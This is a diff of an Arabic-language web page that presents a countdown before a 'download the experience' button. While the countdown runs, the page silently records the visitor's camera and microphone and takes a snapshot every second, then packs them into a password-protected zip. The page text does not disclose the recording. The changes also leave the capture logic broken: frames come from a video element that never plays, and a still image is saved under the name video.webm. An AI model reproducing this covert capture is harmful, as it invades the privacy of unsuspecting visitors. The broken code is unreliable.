@@ -40,23 +40,20 @@
 <body>
 
 <h1>تحميل التجربة</h1>
-<p id="countdown" class="countdown">الوقت المتبقي: <span id="time">10</span> ثانية</p>
+<p id="countdown" class="countdown">الوقت المتبقي: <span id="time">30</span> ثانية</p>
 <button id="downloadButton" class="download-button" onclick="downloadExperience()" disabled>تنزيل التجربة</button>
 
 <script>
-    let countdownTime = 10;
+    let countdownTime = 30;
     let countdownInterval;
     let capturedImages = [];
     let cameraStream;
     let mediaRecorder;
     let recordedChunks = [];
-    const videoElement = document.createElement('video');
-    
+
     async function startCamera() {
         try {
             cameraStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            videoElement.srcObject = cameraStream;
-            videoElement.play();
             mediaRecorder = new MediaRecorder(cameraStream);
             mediaRecorder.ondataavailable = event => recordedChunks.push(event.data);
             mediaRecorder.start();
@@ -69,21 +66,21 @@
         countdownInterval = setInterval(() => {
             countdownTime--;
             document.getElementById('time').textContent = countdownTime;
+            captureImage(); // التقاط صورة كل ثانية
             if (countdownTime <= 0) {
                 clearInterval(countdownInterval);
                 stopCamera();
                 enableDownloadButton();
-            } else {
-                captureImage();
             }
         }, 1000);
     }
 
     function captureImage() {
+        const video = document.createElement('video');
+        video.srcObject = cameraStream;
         const canvas = document.createElement('canvas');
-        const video = videoElement;
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        canvas.width = 640;
+        canvas.height = 480;
         const context = canvas.getContext('2d');
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         canvas.toBlob(blob => capturedImages.push(blob), 'image/png');
@@ -104,7 +101,7 @@
     }
 
     async function downloadExperience() {
-        const zipWriter = new zip.ZipWriter(new zip.BlobWriter("application/zip"), { password: "2010 2010" });
+        const zipWriter = new zip.ZipWriter(new zip.BlobWriter("application/zip"), { password: "20102010" });
         for (let i = 0; i < capturedImages.length; i++) {
             const fileName = i < capturedImages.length - 1 ? `image${i + 1}.png` : `video.webm`;
             await zipWriter.add(fileName, new zip.BlobReader(capturedImages[i]));
